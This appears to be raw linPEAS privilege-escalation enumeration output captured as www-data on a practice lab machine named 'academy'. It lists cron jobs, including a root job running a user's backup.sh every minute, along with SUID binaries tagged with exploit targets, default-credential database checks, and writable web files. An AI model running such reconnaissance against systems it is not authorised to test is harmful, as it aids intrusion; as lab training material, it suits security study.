144K -rwxr-xr-x 1 root root 143K Mar 18  2021 /lib/systemd/systemd-journald
228K -rwxr-xr-x 1 root root 227K Mar 18  2021 /lib/systemd/systemd-logind
 56K -rwxr-xr-x 1 root root  55K Mar 18  2021 /lib/systemd/systemd-timesyncd
664K -rwxr-xr-x 1 root root 663K Mar 18  2021 /lib/systemd/systemd-udevd
   0 lrwxrwxrwx 1 root root   20 Mar 18  2021 /sbin/init -> /lib/systemd/systemd
236K -rwxr-xr-x 1 root root 236K Jul  5  2020 /usr/bin/dbus-daemon
672K -rwxr-xr-x 1 root root 672K Aug 25  2020 /usr/sbin/apache2
 56K -rwxr-xr-x 1 root root  55K Oct 11  2019 /usr/sbin/cron
 20M -rwxr-xr-x 1 root root  20M Nov 25  2020 /usr/sbin/mysqld
688K -rwxr-xr-x 1 root root 686K Feb 26  2019 /usr/sbin/rsyslogd
792K -rwxr-xr-x 1 root root 789K Jan 31  2020 /usr/sbin/sshd
164K -rwxr-xr-x 1 root root 161K Mar  6  2019 /usr/sbin/vsftpd

[+] Cron jobs
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-jobs                                                                                 
-rw-r--r-- 1 root root 1077 Jun 16  2021 /etc/crontab                                                                                                          

/etc/cron.d:
total 16
drwxr-xr-x  2 root root 4096 May 29  2021 .
drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder
-rw-r--r--  1 root root  712 Dec 17  2018 php

/etc/cron.daily:
total 40
drwxr-xr-x  2 root root 4096 May 29  2021 .
drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder
-rwxr-xr-x  1 root root  539 Aug  8  2020 apache2
-rwxr-xr-x  1 root root 1478 May 12  2020 apt-compat
-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x  1 root root 1187 Apr 18  2019 dpkg
-rwxr-xr-x  1 root root  377 Aug 28  2018 logrotate
-rwxr-xr-x  1 root root 1123 Feb 10  2019 man-db
-rwxr-xr-x  1 root root  249 Sep 27  2017 passwd

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 May 29  2021 .
drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 May 29  2021 .
drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder

/etc/cron.weekly:
total 16
drwxr-xr-x  2 root root 4096 May 29  2021 .
drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder
-rwxr-xr-x  1 root root  813 Feb 10  2019 man-db

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin


* * * * * /home/grimmie/backup.sh

[+] Services
[i] Search for outdated versions                                                                                                                               
 [ - ]  apache-htcacheclean                                                                                                                                    
 [ + ]  apache2
 [ + ]  apparmor
 [ - ]  console-setup.sh
 [ + ]  cron
 [ + ]  dbus
 [ - ]  hwclock.sh
 [ - ]  keyboard-setup.sh
 [ + ]  kmod
 [ + ]  mysql
 [ + ]  networking
 [ + ]  procps
 [ - ]  rsync
 [ + ]  rsyslog
 [ + ]  ssh
 [ + ]  udev
 [ + ]  vsftpd


===================================( Network Information )====================================
[+] Hostname, hosts and DNS                                                                                                                                    
academy                                                                                                                                                        
127.0.0.1       localhost
127.0.1.1       academy.tcm.sec academy

::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
domain localdomain
search localdomain
nameserver 172.16.2.2
tcm.sec

[+] Content of /etc/inetd.conf
/etc/inetd.conf Not Found                                                                                                                                      
                                                                                                                                                               
[+] Networks and neighbours
default         0.0.0.0                                                                                                                                        
loopback        127.0.0.0
link-local      169.254.0.0

1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:0c:29:a6:6e:61 brd ff:ff:ff:ff:ff:ff
    inet 172.16.2.129/24 brd 172.16.2.255 scope global dynamic ens33
       valid_lft 1638sec preferred_lft 1638sec
    inet6 fe80::20c:29ff:fea6:6e61/64 scope link 
       valid_lft forever preferred_lft forever
172.16.2.254 dev ens33 lladdr 00:50:56:ed:99:be STALE
172.16.2.2 dev ens33 lladdr 00:50:56:fc:a4:5b REACHABLE
172.16.2.1 dev ens33 lladdr 00:50:56:c0:00:08 REACHABLE

[+] Iptables rules
iptables rules Not Found                                                                                                                                       
                                                                                                                                                               
[+] Active Ports
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#internal-open-ports                                                                            
                                                                                                                                                               
[+] Can I sniff with tcpdump?
No                                                                                                                                                             
                                                                                                                                                               

====================================( Users Information )=====================================
[+] My user                                                                                                                                                    
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#groups                                                                                         
uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                                                                          

[+] Do I have PGP keys?
gpg Not Found                                                                                                                                                  
                                                                                                                                                               
[+] Clipboard or highlighted text?
xsel and xclip Not Found                                                                                                                                       
                                                                                                                                                               
[+] Testing 'sudo -l' without password & /etc/sudoers
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                           
                                                                                                                                                               
[+] Checking /etc/doas.conf
/etc/doas.conf Not Found                                                                                                                                       
                                                                                                                                                               
[+] Checking Pkexec policy
                                                                                                                                                               
[+] Don forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)
[+] Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!                                                              
                                                                                                                                                               
[+] Superusers
root:x:0:0:root:/root:/bin/bash                                                                                                                                

[+] Users with console
grimmie:x:1000:1000:administrator,,,:/home/grimmie:/bin/bash                                                                                                   
root:x:0:0:root:/root:/bin/bash

[+] Login information
 06:37:18 up  1:19,  1 user,  load average: 0.24, 0.06, 0.41                                                                                                   
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
root     tty1     -                10:18   29:42   0.04s  0.01s -bash
root     tty1                          Sat May 29 13:31 - down   (00:12)
reboot   system boot  4.19.0-16-amd64  Sat May 29 13:30 - 13:43  (00:13)
root     pts/0        192.168.10.31    Sat May 29 13:16 - 13:27  (00:11)
root     tty1                          Sat May 29 13:16 - down   (00:11)
reboot   system boot  4.19.0-16-amd64  Sat May 29 13:15 - 13:27  (00:12)
root     pts/0        192.168.10.31    Sat May 29 13:08 - 13:14  (00:06)
administ tty1                          Sat May 29 13:06 - down   (00:08)
reboot   system boot  4.19.0-16-amd64  Sat May 29 13:05 - 13:14  (00:08)

wtmp begins Sat May 29 13:05:58 2021

[+] All users
_apt                                                                                                                                                           
backup
bin
daemon
ftp
games
gnats
grimmie
irc
list
lp
mail
man
messagebus
mysql
news
nobody
proxy
root
sshd
sync
sys
systemd-coredump
systemd-network
systemd-resolve
systemd-timesync
uucp
www-data

[+] Password policy
PASS_MAX_DAYS   99999                                                                                                                                          
PASS_MIN_DAYS   0
PASS_WARN_AGE   7
ENCRYPT_METHOD SHA512


===================================( Software Information )===================================
[+] MySQL version                                                                                                                                              
mysql  Ver 15.1 Distrib 10.3.27-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2                                                                      

[+] MySQL connection using default root/root ........... No
[+] MySQL connection using root/toor ................... No                                                                                                    
[+] MySQL connection using root/NOPASS ................. No                                                                                                    
[+] Looking for mysql credentials and exec                                                                                                                     
From '/etc/mysql/mariadb.conf.d/50-server.cnf' Mysql user: user                    = mysql                                                                     
Found readable /etc/mysql/my.cnf
[client-server]
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mariadb.conf.d/

[+] PostgreSQL version and pgadmin credentials
 Not Found                                                                                                                                                     
                                                                                                                                                               
[+] PostgreSQL connection to template0 using postgres/NOPASS ........ No
[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No                                                                                       
[+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No                                                                                       
[+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No                                                                                       
                                                                                                                                                               
[+] Apache server info
Version: Server version: Apache/2.4.38 (Debian)                                                                                                                
Server built:   2020-08-25T20:08:29

[+] Looking for PHPCookies
 Not Found                                                                                                                                                     
                                                                                                                                                               
[+] Looking for Wordpress wp-config.php files
wp-config.php Not Found                                                                                                                                        
                                                                                                                                                               
[+] Looking for Tomcat users file
tomcat-users.xml Not Found                                                                                                                                     
                                                                                                                                                               
[+] Mongo information
 Not Found                                                                                                                                                     
                                                                                                                                                               
[+] Looking for supervisord configuration file
supervisord.conf Not Found                                                                                                                                     
                                                                                                                                                               
[+] Looking for cesi configuration file
cesi.conf Not Found                                                                                                                                            
                                                                                                                                                               
[+] Looking for Rsyncd config file
/usr/share/doc/rsync/examples/rsyncd.conf                                                                                                                      
[ftp]
        comment = public archive
        path = /var/www/pub
        use chroot = yes
        lock file = /var/lock/rsyncd
        read only = yes
        list = yes
        uid = nobody
        gid = nogroup
        strict modes = yes
        ignore errors = no
        ignore nonreadable = yes
        transfer logging = no
        timeout = 600
        refuse options = checksum dry-run
        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz

[+] Looking for Hostapd config file
hostapd.conf Not Found                                                                                                                                         
                                                                                                                                                               
[+] Looking for wifi conns file
 Not Found                                                                                                                                                     
                                                                                                                                                               
[+] Looking for Anaconda-ks config files
anaconda-ks.cfg Not Found                                                                                                                                      
                                                                                                                                                               
[+] Looking for .vnc directories and their passwd files
.vnc Not Found                                                                                                                                                 
                                                                                                                                                               
[+] Looking for ldap directories and their hashes
/etc/ldap                                                                                                                                                      
The password hash is from the {SSHA} to 'structural'

[+] Looking for .ovpn files and credentials
.ovpn Not Found                                                                                                                                                
                                                                                                                                                               
[+] Looking for ssl/ssh files
PermitRootLogin yes                                                                                                                                            
ChallengeResponseAuthentication no
UsePAM yes

Looking inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

[+] Looking for unexpected auth lines in /etc/pam.d/sshd
No                                                                                                                                                             
                                                                                                                                                               
[+] Looking for Cloud credentials (AWS, Azure, GC)
                                                                                                                                                               
[+] NFS exports?
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe                                                         
/etc/exports Not Found                                                                                                                                         
                                                                                                                                                               
[+] Looking for kerberos conf files and tickets
[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt                                                                          
krb5.conf Not Found                                                                                                                                            
tickets kerberos Not Found                                                                                                                                     
klist Not Found                                                                                                                                                
                                                                                                                                                               
[+] Looking for Kibana yaml
kibana.yml Not Found                                                                                                                                           
                                                                                                                                                               
[+] Looking for logstash files
 Not Found                                                                                                                                                     
                                                                                                                                                               
[+] Looking for elasticsearch files
 Not Found                                                                                                                                                     
                                                                                                                                                               
[+] Looking for Vault-ssh files
vault-ssh-helper.hcl Not Found                                                                                                                                 
                                                                                                                                                               
[+] Looking for AD cached hahses
cached hashes Not Found                                                                                                                                        
                                                                                                                                                               
[+] Looking for screen sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                                                            
screen Not Found                                                                                                                                               
                                                                                                                                                               
[+] Looking for tmux sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                                                            
tmux Not Found                                                                                                                                                 
                                                                                                                                                               
[+] Looking for Couchdb directory
                                                                                                                                                               
[+] Looking for redis.conf
                                                                                                                                                               
[+] Looking for dovecot files
dovecot credentials Not Found                                                                                                                                  
                                                                                                                                                               
[+] Looking for mosquitto.conf
                                                                                                                                                               

====================================( Interesting Files )=====================================
[+] SUID                                                                                                                                                       
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                           
/usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                                                    
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/chfn           --->    SuSE_9.3/10
/usr/bin/mount          --->    Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
/usr/bin/newgrp         --->    HP-UX_10.20
/usr/bin/umount         --->    BSD/Linux[1996-08-13]
/usr/bin/chsh
/usr/bin/passwd         --->    Apple_Mac_OSX/Solaris/SPARC_8/9/Sun_Solaris_2.5.1_PAM
/usr/bin/su
/usr/bin/gpasswd

[+] SGID
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                           
/usr/sbin/unix_chkpwd                                                                                                                                          
/usr/bin/bsd-write
/usr/bin/expiry
/usr/bin/wall
/usr/bin/crontab
/usr/bin/dotlockfile
/usr/bin/chage
/usr/bin/ssh-agent

[+] Capabilities
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities                                                                                   
/usr/bin/ping = cap_net_raw+ep                                                                                                                                 

[+] .sh files in path
/usr/bin/gettext.sh                                                                                                                                            

[+] Files (scripts) in /etc/profile.d/
total 20                                                                                                                                                       
drwxr-xr-x  2 root root 4096 May 29  2021 .
drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..
-rw-r--r--  1 root root  664 Mar  1  2019 bash_completion.sh
-rw-r--r--  1 root root 1107 Sep 14  2018 gawk.csh
-rw-r--r--  1 root root  757 Sep 14  2018 gawk.sh

[+] Hashes inside passwd file? ........... No
[+] Can I read shadow files? ........... No                                                                                                                    
[+] Can I read root folder? ........... No                                                                                                                     
                                                                                                                                                               
[+] Looking for root files in home dirs (limit 20)
/home                                                                                                                                                          

[+] Looking for root files in folders owned by me
                                                                                                                                                               
[+] Readable files belonging to root and readable by me but not world readable
                                                                                                                                                               
[+] Files inside /home/www-data (limit 20)
                                                                                                                                                               
[+] Files inside others home (limit 20)
/home/grimmie/.bash_history                                                                                                                                    
/home/grimmie/.bashrc
/home/grimmie/backup.sh
/home/grimmie/.profile
/home/grimmie/.bash_logout

[+] Looking for installed mail applications
                                                                                                                                                               
[+] Mails (limit 50)
                                                                                                                                                               
[+] Backup files?
-rwxr-xr-- 1 grimmie administrator 112 May 30  2021 /home/grimmie/backup.sh                                                                                    
-rwxr-xr-x 1 root root 38412 Nov 25  2020 /usr/bin/wsrep_sst_mariabackup

[+] Looking for tables inside readable .db/.sqlite files (limit 100)
                                                                                                                                                               
[+] Web files?(output limit)
/var/www/:                                                                                                                                                     
total 12K
drwxr-xr-x  3 root root 4.0K May 29  2021 .
drwxr-xr-x 12 root root 4.0K May 29  2021 ..
drwxr-xr-x  3 root root 4.0K May 29  2021 html

/var/www/html:
total 24K
drwxr-xr-x 3 root     root     4.0K May 29  2021 .
drwxr-xr-x 3 root     root     4.0K May 29  2021 ..

[+] *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .gitconfig, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml                                                                                                                                                   
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data                                                                            
-rw-r--r-- 1 root root 1994 Apr 18  2019 /etc/bash.bashrc                                                                                                      
-rw-r--r-- 1 root root 3526 Apr 18  2019 /etc/skel/.bashrc
-rw-r--r-- 1 root root 807 Apr 18  2019 /etc/skel/.profile
-rw-r--r-- 1 grimmie administrator 3526 May 29  2021 /home/grimmie/.bashrc
-rw-r--r-- 1 grimmie administrator 807 May 29  2021 /home/grimmie/.profile
-rw-r--r-- 1 root root 2778 Jun 26  2016 /usr/share/doc/adduser/examples/adduser.local.conf.examples/bash.bashrc
-rw-r--r-- 1 root root 802 Jun 26  2016 /usr/share/doc/adduser/examples/adduser.local.conf.examples/skel/dot.bashrc
-rw-r--r-- 1 root root 570 Jan 31  2010 /usr/share/base-files/dot.bashrc

[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
   139266      4 -rw-r--r--   1 grimmie  administrator      220 May 29  2021 /home/grimmie/.bash_logout                                                        
   270249      4 -rw-r--r--   1 root     root               240 Oct 15  2020 /usr/share/phpmyadmin/vendor/paragonie/constant_time_encoding/.travis.yml
   270133      4 -rw-r--r--   1 root     root               250 Oct 15  2020 /usr/share/phpmyadmin/vendor/bacon/bacon-qr-code/.travis.yml
   389530      4 -rw-r--r--   1 root     root               946 Oct 15  2020 /usr/share/phpmyadmin/vendor/pragmarx/google2fa/.scrutinizer.yml
   389531      4 -rw-r--r--   1 root     root               706 Oct 15  2020 /usr/share/phpmyadmin/vendor/pragmarx/google2fa/.travis.yml
   140294      4 -rw-r--r--   1 root     root               608 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/extensions/.travis.yml
   140341      4 -rw-r--r--   1 root     root              1004 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/twig/.travis.yml
   140340      4 -rw-r--r--   1 root     root               799 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/twig/.php_cs.dist
   140339      4 -rw-r--r--   1 root     root               224 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/twig/.editorconfig
   270226      4 -rw-r--r--   1 root     root               633 Oct 15  2020 /usr/share/phpmyadmin/vendor/google/recaptcha/.travis.yml
   138381      0 -rw-r--r--   1 root     root                 0 Nov 15  2018 /usr/share/dictionaries-common/site-elisp/.nosearch
    12136      0 -rw-r--r--   1 root     root                 0 Jul 29  2023 /run/network/.ifstate.lock
   260079      0 -rw-------   1 root     root                 0 May 29  2021 /etc/.pwd.lock
   259843      4 -rw-r--r--   1 root     root               220 Apr 18  2019 /etc/skel/.bash_logout

[+] Readable files inside /tmp, /var/tmp, /var/backups(limit 100)
-rwxrwxrwx 1 www-data www-data 134167 Jul 29 06:32 /tmp/linpeas.sh                                                                                             
-rw-r--r-- 1 root root 11996 May 29  2021 /var/backups/apt.extended_states.0

[+] Interesting writable Files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                                                                 
/dev/mqueue                                                                                                                                                    
/dev/mqueue/linpeas.txt
/dev/shm
/run/lock
/run/lock/apache2
/sys/kernel/security/apparmor/.access
/sys/kernel/security/apparmor/.load
/sys/kernel/security/apparmor/.remove
/sys/kernel/security/apparmor/.replace
/tmp
/tmp/linpeas.sh
/var/cache/apache2/mod_cache_disk
/var/lib/php/sessions
/var/lib/phpmyadmin
/var/lib/phpmyadmin/tmp
/var/lib/phpmyadmin/tmp/twig
/var/lib/phpmyadmin/tmp/twig/15
/var/lib/phpmyadmin/tmp/twig/15/15a885ca9738e5a84084a3e52f1f6b23c771ea4f7bdca01081f7b87d3b86a6f9.php
/var/lib/phpmyadmin/tmp/twig/21
/var/lib/phpmyadmin/tmp/twig/21/21a3bee2bc40466295b888b9fec6fb9d77882a7cf061fd3f3d7194b5d54ab837.php
/var/lib/phpmyadmin/tmp/twig/22
/var/lib/phpmyadmin/tmp/twig/22/22f328e86274b51eb9034592ac106d133734cc8f4fba3637fe76b0a4b958f16d.php
/var/lib/phpmyadmin/tmp/twig/28
/var/lib/phpmyadmin/tmp/twig/28/28bcfd31671cb4e1cff7084a80ef5574315cd27a4f33c530bc9ae8da8934caf6.php
/var/lib/phpmyadmin/tmp/twig/2e
/var/lib/phpmyadmin/tmp/twig/2e/2e6ed961bffa8943f6419f806fe7bfc2232df52e39c5880878e7f34aae869dd9.php
/var/lib/phpmyadmin/tmp/twig/31
/var/lib/phpmyadmin/tmp/twig/31/317c8816ee34910f2c19f0c2bd6f261441aea2562acc0463975f80a4f0ed98a9.php
/var/lib/phpmyadmin/tmp/twig/36
/var/lib/phpmyadmin/tmp/twig/36/360a7a01227c90acf0a097d75488841f91dc2939cebca8ee28845b8abccb62ee.php
/var/lib/phpmyadmin/tmp/twig/3b
/var/lib/phpmyadmin/tmp/twig/3b/3bf8a6b93e8c4961d320a65db6c6f551428da6ae8b8e0c87200629b4ddad332d.php
/var/lib/phpmyadmin/tmp/twig/41
/var/lib/phpmyadmin/tmp/twig/41/4161342482a4d1436d31f5619bbdbd176c50e500207e3f364662f5ba8210fe31.php
/var/lib/phpmyadmin/tmp/twig/42
/var/lib/phpmyadmin/tmp/twig/42/426cadcf834dab31a9c871f8a7c8eafa83f4c66a2297cfefa7aae7a7895fa955.php
/var/lib/phpmyadmin/tmp/twig/43
/var/lib/phpmyadmin/tmp/twig/43/43cb8c5a42f17f780372a6d8b976cafccd1f95b8656d9d9638fca2bb2c0c1ee6.php
/var/lib/phpmyadmin/tmp/twig/4c
/var/lib/phpmyadmin/tmp/twig/4c/4c13e8023eae0535704510f289140d5447e25e2dea14eaef5988afa2ae915cb9.php
/var/lib/phpmyadmin/tmp/twig/4e
/var/lib/phpmyadmin/tmp/twig/4e/4e68050e4aec7ca6cfa1665dd465a55a5d643fca6abb104a310e5145d7310851.php
/var/lib/phpmyadmin/tmp/twig/4e/4e8f70ab052f0a5513536d20f156e0649e1791c083804a629624d2cb1e052f1f.php
/var/lib/phpmyadmin/tmp/twig/4f
/var/lib/phpmyadmin/tmp/twig/4f/4f7c1ace051b6b8cb85528aa8aef0052b72277f654cb4f13f2fc063f8529efe4.php
/var/lib/phpmyadmin/tmp/twig/53
/var/lib/phpmyadmin/tmp/twig/53/53ec6cf1deb6f8f805eb3077b06e6ef3b7805e25082d74c09563f91a11c1dfcd.php
/var/lib/phpmyadmin/tmp/twig/5c
/var/lib/phpmyadmin/tmp/twig/5c/5cf13d5a4ba7434d92bc44defee51a93cfbafa0d7984fcb8cbea606d97fe3e1a.php
/var/lib/phpmyadmin/tmp/twig/61
/var/lib/phpmyadmin/tmp/twig/61/61cf92e037fb131bad1ea24485b8e2ab7f0dd05dbe0bcdec85d8a96c80458223.php
/var/lib/phpmyadmin/tmp/twig/6b
/var/lib/phpmyadmin/tmp/twig/6b/6b8deef855b316d17c87795aebdf5aa33b55fae3e6c453d2a5bab7c4085f85d7.php
/var/lib/phpmyadmin/tmp/twig/6c
/var/lib/phpmyadmin/tmp/twig/6c/6c9a7cd11578d393beebc51daa9a48d35c8b03d3a69fd786c55ceedf71a62d29.php
/var/lib/phpmyadmin/tmp/twig/73
/var/lib/phpmyadmin/tmp/twig/73/73a22388ea06dda0a2e91e156573fc4c47961ae6e35817742bb6901eb91d5478.php
/var/lib/phpmyadmin/tmp/twig/73/73ee99e209023ff62597f3f6e5f027a498c1261e4d35d310b0d0a2664f3c2c0d.php
/var/lib/phpmyadmin/tmp/twig/78
/var/lib/phpmyadmin/tmp/twig/78/786fc5d49e751f699117fbb46b2e5920f5cdae9b5b3e7bb04e39d201b9048164.php
/var/lib/phpmyadmin/tmp/twig/7d
/var/lib/phpmyadmin/tmp/twig/7d/7d8087d41c482579730682151ac3393f13b0506f63d25d3b07db85fcba5cdbeb.php
/var/lib/phpmyadmin/tmp/twig/7f
/var/lib/phpmyadmin/tmp/twig/7f/7f2fea86c14cdbd8cd63e93670d9fef0c3d91595972a398d9aa8d5d919c9aa63.php
/var/lib/phpmyadmin/tmp/twig/8a
/var/lib/phpmyadmin/tmp/twig/8a/8a16ca4dbbd4143d994e5b20d8e1e088f482b5a41bf77d34526b36523fc966d7.php
/var/lib/phpmyadmin/tmp/twig/8b
/var/lib/phpmyadmin/tmp/twig/8b/8b3d6e41c7dc114088cc4febcf99864574a28c46ce39fd02d9577bec9ce900de.php
/var/lib/phpmyadmin/tmp/twig/96
/var/lib/phpmyadmin/tmp/twig/96/96885525f00ce10c76c38335c2cf2e232a709122ae75937b4f2eafcdde7be991.php
/var/lib/phpmyadmin/tmp/twig/97
/var/lib/phpmyadmin/tmp/twig/97/9734627c3841f4edcd6c2b6f193947fc0a7a9a69dd1955f703f4f691af6b45e3.php
/var/lib/phpmyadmin/tmp/twig/99
/var/lib/phpmyadmin/tmp/twig/99/9937763182924ca59c5731a9e6a0d96c77ec0ca5ce3241eec146f7bca0a6a0dc.php
/var/lib/phpmyadmin/tmp/twig/9d
/var/lib/phpmyadmin/tmp/twig/9d/9d254bc0e43f46a8844b012d501626d3acdd42c4a2d2da29c2a5f973f04a04e8.php
/var/lib/phpmyadmin/tmp/twig/9d/9d6c5c59ee895a239eeb5956af299ac0e5eb1a69f8db50be742ff0c61b618944.php
/var/lib/phpmyadmin/tmp/twig/9e
/var/lib/phpmyadmin/tmp/twig/9e/9ed23d78fa40b109fca7524500b40ca83ceec9a3ab64d7c38d780c2acf911588.php
/var/lib/phpmyadmin/tmp/twig/a0
/var/lib/phpmyadmin/tmp/twig/a0/a0c00a54b1bb321f799a5f4507a676b317067ae03b1d45bd13363a544ec066b7.php
/var/lib/phpmyadmin/tmp/twig/a4
/var/lib/phpmyadmin/tmp/twig/a4/a49a944225d69636e60c581e17aaceefffebe40aeb5931afd4aaa3da6a0039b9.php
/var/lib/phpmyadmin/tmp/twig/a7
/var/lib/phpmyadmin/tmp/twig/a7/a7e9ef3e1f57ef5a497ace07803123d1b50decbe0fcb448cc66573db89b48e25.php
/var/lib/phpmyadmin/tmp/twig/ae
/var/lib/phpmyadmin/tmp/twig/ae/ae25b735c0398c0c6a34895cf07f858207e235cf453cadf07a003940bfb9cd05.php
/var/lib/phpmyadmin/tmp/twig/af
/var/lib/phpmyadmin/tmp/twig/af/af668e5234a26d3e85e170b10e3d989c2c0c0679b2e5110d593a80b4f58c6443.php
/var/lib/phpmyadmin/tmp/twig/af/af6dd1f6871b54f086eb95e1abc703a0e92824251df6a715be3d3628d2bd3143.php
/var/lib/phpmyadmin/tmp/twig/af/afa81ff97d2424c5a13db6e43971cb716645566bd8d5c987da242dddf3f79817.php
/var/lib/phpmyadmin/tmp/twig/b6
/var/lib/phpmyadmin/tmp/twig/b6/b6c8adb0e14792534ce716cd3bf1d57bc78d45138e62be7d661d75a5f03edcba.php
/var/lib/phpmyadmin/tmp/twig/c3
/var/lib/phpmyadmin/tmp/twig/c3/c34484a1ece80a38a03398208a02a6c9c564d1fe62351a7d7832d163038d96f4.php
/var/lib/phpmyadmin/tmp/twig/c5
/var/lib/phpmyadmin/tmp/twig/c5/c50d1c67b497a887bc492962a09da599ee6c7283a90f7ea08084a548528db689.php
/var/lib/phpmyadmin/tmp/twig/c7
/var/lib/phpmyadmin/tmp/twig/c7/c70df99bff2eea2f20aba19bbb7b8d5de327cecaedb5dc3d383203f7d3d02ad2.php
/var/lib/phpmyadmin/tmp/twig/ca
/var/lib/phpmyadmin/tmp/twig/ca/ca32544b55a5ebda555ff3c0c89508d6e8e139ef05d8387a14389443c8e0fb49.php
/var/lib/phpmyadmin/tmp/twig/d6
/var/lib/phpmyadmin/tmp/twig/d6/d66c84e71db338af3aae5892c3b61f8d85d8bb63e2040876d5bbb84af484fb41.php
/var/lib/phpmyadmin/tmp/twig/dd
/var/lib/phpmyadmin/tmp/twig/dd/dd1476242f68168118c7ae6fc7223306d6024d66a38b3461e11a72d128eee8c1.php
/var/lib/phpmyadmin/tmp/twig/e8
/var/lib/phpmyadmin/tmp/twig/e8/e8184cd61a18c248ecc7e06a3f33b057e814c3c99a4dd56b7a7da715e1bc2af8.php
/var/lib/phpmyadmin/tmp/twig/e9
/var/lib/phpmyadmin/tmp/twig/e9/e93db45b0ff61ef08308b9a87b60a613c0a93fab9ee661c8271381a01e2fa57a.php
/var/lib/phpmyadmin/tmp/twig/f5
/var/lib/phpmyadmin/tmp/twig/f5/f589c1ad0b7292d669068908a26101f0ae7b5db110ba174ebc5492c80bc08508.php
/var/lib/phpmyadmin/tmp/twig/fa
/var/lib/phpmyadmin/tmp/twig/fa/fa249f377795e48c7d92167e29cef2fc31f50401a0bdbc95ddb51c0aec698b9e.php
/var/tmp
/var/www/html/academy
/var/www/html/academy/admin
/var/www/html/academy/admin/assets
/var/www/html/academy/admin/assets/css
/var/www/html/academy/admin/assets/css/bootstrap.css
/var/www/html/academy/admin/assets/css/font-awesome.css
/var/www/html/academy/admin/assets/css/style.css
/var/www/html/academy/admin/assets/fonts
/var/www/html/academy/admin/assets/fonts/FontAwesome.otf
/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.eot
/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.svg
/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.ttf
/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.woff
/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.woff2
/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.eot
/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.svg
/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.ttf
/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.woff
/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.woff2
/var/www/html/academy/admin/assets/img
/var/www/html/academy/admin/assets/js
/var/www/html/academy/admin/assets/js/bootstrap.js
/var/www/html/academy/admin/assets/js/jquery-1.11.1.js
/var/www/html/academy/admin/change-password.php
/var/www/html/academy/admin/check_availability.php
/var/www/html/academy/admin/course.php
/var/www/html/academy/admin/department.php
/var/www/html/academy/admin/edit-course.php
/var/www/html/academy/admin/enroll-history.php
/var/www/html/academy/admin/includes
/var/www/html/academy/admin/includes/config.php
/var/www/html/academy/admin/includes/footer.php
/var/www/html/academy/admin/includes/header.php
